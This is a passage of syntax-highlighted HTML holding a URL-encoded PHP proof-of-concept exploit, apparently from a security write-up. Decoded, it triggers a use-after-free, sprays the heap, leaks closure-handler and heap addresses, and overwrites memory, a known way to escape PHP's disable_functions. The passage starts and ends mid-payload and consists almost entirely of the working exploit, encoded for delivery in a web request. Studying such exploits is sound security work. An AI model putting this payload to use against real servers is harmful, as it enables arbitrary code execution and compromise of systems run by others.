class="hljs-number">24</span>%<span class="hljs-number">66</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">79</span>%<span class="hljs-number">20</span>%<span class="hljs-number">21</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">75</span>%<span class="hljs-number">72</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">67</span>%<span class="hljs-number">67</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">75</span>%<span class="hljs-number">61</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">67</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">67</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">68</span>%<span class="hljs-number">75</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">27</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">76</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">65</span>%<span class="hljs-number">77</span>%<span class="hljs-number">20</span>%<span class="hljs-number">56</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>e%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">76</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>e%<span class="hljs-number">2</span>d%<span class="hljs-number">3</span>e%<span class="hljs-number">61</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">67</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">28</span>%<span class="hljs-number">50</span>%<span class="hljs-number">48</span>%<span class="hljs-number">50</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">4</span>f%<span class="hljs-number">53</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">27</span>%<span class="hljs-number">57</span>%<span class="hljs-number">49</span>%<span class="hljs-number">4</span>e%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">64</span>%<span class="hljs-number">69</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">27</span>%<span class="hljs-number">54</span>%<span class="hljs-number">68</span>%<span class="hljs-number">69</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">50</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">43</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>a%<span class="hljs-number">6</span>e%<span class="hljs-number">69</span>%<span class="hljs-number">78</span>%<span class="hljs-number">20</span>%<span class="hljs-number">73</span>%<span class="hljs-number">79</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">6</span>c%<span class="hljs-number">79</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">5</span>f%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>f%<span class="hljs-number">63</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">31</span>%<span class="hljs-number">30</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">67</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">75</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">5</span>b%<span class="hljs-number">5</span>d%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">72</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">5</span>f%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>f%<span class="hljs-number">63</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">2</span>b%<span class="hljs-number">29</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">67</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">75</span>%<span class="hljs-number">73</span>%<span class="hljs-number">5</span>b%<span class="hljs-number">5</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">68</span>%<span class="hljs-number">75</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">27</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">67</span>%<span class="hljs-number">67</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">75</span>%<span class="hljs-number">61</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">27</span>%<span class="hljs-number">78</span>%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>b%<span class="hljs-number">31</span>%<span class="hljs-number">5</span>d%<span class="hljs-number">5</span>b%<span class="hljs-number">27</span>%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">67</span>%<span class="hljs-number">73</span>%<span class="hljs-number">27</span>%<span class="hljs-number">5</span>d%<span class="hljs-number">5</span>b%<span class="hljs-number">30</span>%<span class="hljs-number">5</span>d%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">68</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">70</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">65</span>%<span class="hljs-number">77</span>%<span class="hljs-number">20</span>%<span class="hljs-number">48</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">70</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">68</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">70</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">3</span>e%<span class="hljs-number">62</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">78</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">37</span>%<span class="hljs-number">39</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>c%<span class="hljs-number">7</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">64</span>%<span class="hljs-number">69</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">22</span>%<span class="hljs-number">55</span>%<span class="hljs-number">41</span>%<span class="hljs-number">46</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">61</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">64</span>%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">75</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">68</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">64</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">32</span>%<span class="hljs-number">70</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">68</span>%<span class="hljs-number">70</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">68</span>%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">70</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">32</span>%<span class="hljs-number">70</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">35</span>%<span class="hljs-number">38</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">68</span>%<span class="hljs-number">70</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">68</span>%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">70</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">63</span>%<span class="hljs-number">38</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">36</span>%<span class="hljs-number">30</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">32</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">36</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">31</span>%<span class="hljs-number">30</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>b%<span 